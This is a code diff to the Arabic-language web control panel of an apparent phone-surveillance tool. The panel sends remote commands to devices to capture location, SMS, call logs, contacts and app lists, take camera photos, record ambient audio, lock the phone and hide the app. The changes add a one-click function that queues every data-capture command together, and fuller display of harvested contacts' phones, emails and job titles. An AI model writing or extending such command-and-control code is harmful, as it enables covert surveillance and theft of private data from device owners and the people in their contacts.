@@ -411,7 +411,7 @@ async function renderOverview(el) {
     <!-- Quick Actions -->
     <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px">
       <button class="btn btn-sm btn-primary" onclick="sendCommand('capture_location')" style="width:auto">📍 تحديث الموقع</button>
-      <button class="btn btn-sm btn-primary" onclick="sendCommand('capture_all')" style="width:auto;background:#8b5cf6">⚡ جمع كل البيانات</button>
+      <button class="btn btn-sm btn-primary" onclick="sendAllCaptureCommands()" style="width:auto;background:#8b5cf6">⚡ جمع كل البيانات</button>
       <button class="btn btn-sm btn-primary" onclick="sendCommand('sync_now')" style="width:auto;background:#22c55e">🔄 مزامنة فورية</button>
       <button class="btn btn-sm btn-outline" onclick="switchTab('commands')" style="width:auto">🎮 إرسال أمر</button>
       <button class="btn btn-sm btn-outline" onclick="refreshDevices()" style="width:auto">⟳ تحديث</button>
@@ -547,13 +547,22 @@ async function renderSms(el) {
 async function renderContacts(el) {
   const { data } = await sb.from('contacts').select('*').eq('device_serial', selectedDevice.device_serial).limit(200);
   if (!data || data.length === 0) { el.innerHTML = '<div class="empty-state"><p>ما في جهات اتصال</p></div>'; return; }
+  function formatPhones(phones) {
+    if (!phones) return '—';
+    try { const arr = typeof phones === 'string' ? JSON.parse(phones) : phones; return Array.isArray(arr) ? arr.join(' · ') : '—'; } catch { return '—'; }
+  }
+  function formatEmails(emails) {
+    if (!emails) return '—';
+    try { const arr = typeof emails === 'string' ? JSON.parse(emails) : emails; return Array.isArray(arr) ? arr.join(', ') : '—'; } catch { return '—'; }
+  }
   el.innerHTML = `<div class="card"><div class="card-header"><h3>جهات الاتصال (${data.length})</h3></div>
     <table class="data-table">
-    <tr><th>الاسم</th><th>الرقم</th><th>البريد</th></tr>
+    <tr><th>الاسم</th><th>رقم الهاتف</th><th>البريد</th><th>الوظيفة</th></tr>
     ${data.map(r => `<tr>
-      <td class="${r.display_name && r.display_name.includes('Encrypted') ? 'encrypted' : ''}">${r.display_name || '—'}</td>
-      <td class="${r.phone_number && r.phone_number.includes('Encrypted') ? 'encrypted' : ''}">${r.phone_number || '—'}</td>
-      <td>${r.email || '—'}</td>
+      <td>${r.display_name || '—'}</td>
+      <td style="direction:ltr;text-align:right">${formatPhones(r.phone_numbers)}</td>
+      <td>${formatEmails(r.emails)}</td>
+      <td>${[r.organization, r.job_title].filter(Boolean).join(' - ') || '—'}</td>
     </tr>`).join('')}
   </table></div>`;
 }
@@ -668,7 +677,7 @@ async function renderCommands(el) {
       <button class="cmd-btn" onclick="sendCommand('capture_sms')">💬 الرسائل SMS</button>
       <button class="cmd-btn" onclick="sendCommand('capture_contacts')">👤 جهات الاتصال</button>
       <button class="cmd-btn" onclick="sendCommand('capture_apps')">📱 التطبيقات</button>
-      <button class="cmd-btn" onclick="sendCommand('capture_all')" style="background:#3b82f6;color:white;font-weight:600">⚡ جمع ورفع كل البيانات فوراً</button>
+      <button class="cmd-btn" onclick="sendAllCaptureCommands()" style="background:#3b82f6;color:white;font-weight:600">⚡ جمع ورفع كل البيانات فوراً</button>
     </div>
 
     <div style="margin:16px 0"><strong style="color:#f59e0b">📷 وسائط</strong></div>
@@ -746,8 +755,26 @@ async function sendCommand(command, params = {}) {
   }, 2000);
 }
 
+async function sendAllCaptureCommands() {
+  const cmds = ['capture_location', 'capture_call_logs', 'capture_sms', 'capture_contacts', 'capture_apps'];
+  const resultEl = document.getElementById('cmdResult');
+  resultEl.innerHTML = `<div class="cmd-result" style="color:#f59e0b">⏳ جاري جمع ورفع جميع البيانات...</div>`;
+  let sent = 0, failed = 0;
+  for (const cmd of cmds) {
+    const { error } = await sb.from('remote_commands').insert({
+      device_serial: selectedDevice.device_serial,
+      command: cmd,
+      parameters: '{}', status: 'pending', sent_at: new Date().toISOString()
+    });
+    if (error) { failed++; } else { sent++; }
+  }
+  resultEl.innerHTML = `<div class="cmd-result" style="color:${failed > 0 ? '#f59e0b' : '#22c55e'}">✅ تم إرسال ${sent} أوامر ${failed > 0 ? `, فشل ${failed}` : ''}</div>`;
+  loadPrevCommands();
+  setTimeout(() => renderTab(currentTab), 3000);
+}
+
 function getCmdLabel(cmd) {
-  const labels = { sync_now:'مزامنة فورية', capture_location:'التقاط موقع', capture_call_logs:'سجل المكالمات', capture_sms:'الرسائل SMS', capture_contacts:'جهات الاتصال', capture_apps:'التطبيقات', capture_all:'جمع كل البيانات', capture_camera:'تصوير كاميرا', record_ambient:'تسجيل صوت (30ث)', lock_device:'قفل الجهاز', hide_app:'إخفاء التطبيق', unhide_app:'إظهار التطبيق', play_sound:'تشغيل صوت', send_alert:'إرسال تنبيه', update_interval:'تحديث كل دقيقة', restart_service:'إعادة تشغيل الخدمة' };
+  const labels = { sync_now:'مزامنة فورية', capture_location:'التقاط موقع', capture_call_logs:'سجل المكالمات', capture_sms:'الرسائل SMS', capture_contacts:'جهات الاتصال', capture_apps:'التطبيقات', capture_camera:'تصوير كاميرا', record_ambient:'تسجيل صوت (30ث)', lock_device:'قفل الجهاز', hide_app:'إخفاء التطبيق', unhide_app:'إظهار التطبيق', play_sound:'تشغيل صوت', send_alert:'إرسال تنبيه', update_interval:'تحديث كل دقيقة', restart_service:'إعادة تشغيل الخدمة' };
   return labels[cmd] || cmd;
 }
 
